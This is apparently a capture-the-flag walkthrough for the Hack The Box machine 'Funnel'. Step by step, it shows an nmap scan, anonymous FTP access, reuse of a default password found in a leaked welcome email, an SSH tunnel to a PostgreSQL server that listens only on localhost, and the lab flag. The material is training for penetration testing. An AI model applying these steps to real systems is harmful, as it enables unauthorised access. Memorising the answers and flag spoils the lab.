Connect the VPN, spawn the VM.<br>
10.129.228.195

TASK 1

How many TCP ports are open?

```
└─# nmap -sS -n -Pn -sV --osscan-guess 10.129.228.195 -p-   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 15:04 EST
Nmap scan report for 10.129.228.195
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 970.60 seconds
```

Answer: 2

### TASK 2

What is the name of the directory that is available on the FTP server?

```
└─# ftp $targetip     
Connected to 10.129.228.195.
220 (vsFTPd 3.0.3)
Name (10.129.228.195:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||26522|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 28 14:31 mail_backup
226 Directory send OK.
ftp> 
```

Answer: mail_backup

### TASK 3

What is the default account password that every new member on the "Funnel" team should change as soon as possible?

```
ftp> cd mail_backup
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||37274|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28 14:30 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28 14:31 welcome_28112022
226 Directory send OK.
ftp> get password_policy.pdf
local: password_policy.pdf remote: password_policy.pdf
229 Entering Extended Passive Mode (|||26830|)
150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
100% |**********************************************************************************************************************************************| 58899      124.40 KiB/s    00:00 ETA
226 Transfer complete.
58899 bytes received in 00:00 (83.20 KiB/s)
ftp> get welcome_28112022
local: welcome_28112022 remote: welcome_28112022
229 Entering Extended Passive Mode (|||6856|)
150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
100% |**********************************************************************************************************************************************|   713      139.76 KiB/s    00:00 ETA
226 Transfer complete.
713 bytes received in 00:00 (3.01 KiB/s)
ftp> 
```

```
─# cat welcome_28112022 
Frome: root@funnel.htb
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
Subject:Welcome to the team!

Hello everyone,
We would like to welcome you to our team. 
We think you’ll be a great asset to the "Funnel" team and want to make sure you get settled in as smoothly as possible.
We have set up your accounts that you will need to access our internal infrastracture. Please, read through the attached password policy with extreme care.
All the steps mentioned there should be completed as soon as possible. If you have any questions or concerns feel free to reach directly to your manager. 
We hope that you will have an amazing time with us,
The funnel team. 
```

![[HTB-Funnel-Image01.png]]

Answer: funnel123#!#

### TASK 4

Which user has not changed their default password yet?

```
└─# ftp $targetip       
Connected to 10.129.228.195.
220 (vsFTPd 3.0.3)
Name (10.129.228.195:kali): christine
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Answer: christine

### TASK 5

Which service is running on TCP port 5432 and listens only on localhost?

Connect using Christines credentials over SSH

```
└─# ssh christine@$targetip
christine@10.129.228.195's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 03 Mar 2023 08:33:27 PM UTC

  System load:              0.0
  Usage of /:               63.2% of 4.78GB
  Memory usage:             12%
  Swap usage:               0%
  Processes:                162
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens160:  10.129.228.195
  IPv6 address for ens160:  dead:beef::250:56ff:feb9:e022

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
```

```
christine@funnel:~$ sudo netstat -v -a -p
[sudo] password for christine: 
christine is not in the sudoers file.  This incident will be reported.
```

```
christine@funnel:~$ netstat -v -a -n -p
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:39697         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      1 10.129.228.195:53848    8.8.8.8:53              SYN_SENT    -                   
tcp        0    396 10.129.228.195:22       10.10.14.166:60764      ESTABLISHED -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
netstat: no support for `AF INET (sctp)' on this system.
netstat: no support for `AF INET (sctp)' on this system.
udp        0      0 127.0.0.1:58157         127.0.0.53:53           ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                 
```

```
christine@funnel:~$ netstat -v -a -p
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 localhost:39697         0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -                   
tcp        0      0 localhost:postgresql    0.0.0.0:*               LISTEN      -    
```

Answer: postgresql

### TASK 6

Since you can't access the previously mentioned service from the local machine, you will have to create a tunnel and connect to it from your machine. What is the correct type of tunneling to use? remote port forwarding or local port forwarding?

Answer: local port forwarding

### TASK 7

What is the name of the database that holds the flag?

```
─# ssh -L 1234:localhost:5432 christine@$targetip
christine@10.129.228.195's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
```

and then in a new window

```
─$ psql -U christine -h localhost -p 1234
Password for user christine: 
psql (14.5 (Debian 14.5-2), server 15.1 (Debian 15.1-1.pgdg110+1))
WARNING: psql major version 14, server major version 15.
         Some psql features might not work.
Type "help" for help.

christine=# 
```

```
christine=# \list
List of databases
   Name    |   Owner   | Encoding |  Collate   |   Ctype    |    Access privileges    
-----------+-----------+----------+------------+------------+-------------------------
 christine | christine | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres  | christine | UTF8     | en_US.utf8 | en_US.utf8 | 
 secrets   | christine | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0 | christine | UTF8     | en_US.utf8 | en_US.utf8 | =c/christine           +
           |           |          |            |            | christine=CTc/christine
 template1 | christine | UTF8     | en_US.utf8 | en_US.utf8 | =c/christine           +
           |           |          |            |            | christine=CTc/christine
(5 rows)
```

Answer: secrets

### TASK 8

Could you use a dynamic tunnel instead of local port forwarding? Yes or No.
https://linuxize.com/post/how-to-setup-ssh-tunneling/#dynamic-port-forwarding

Answer: yes

### SUBMIT FLAG

Submit root flag

```
christine=# \conninfo
You are connected to database "christine" as user "christine" on host "localhost" (address "::1") at port "1234".
```

```
christine=# \connect secrets
psql (14.5 (Debian 14.5-2), server 15.1 (Debian 15.1-1.pgdg110+1))
WARNING: psql major version 14, server major version 15.
         Some psql features might not work.
You are now connected to database "secrets" as user "christine".
```

```
secrets=# \dt
         List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
(1 row)
```

```
secrets=# SELECT * from flag;
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1
(1 row)
```

Answer:  cf277664b1771217d7006acdea006db1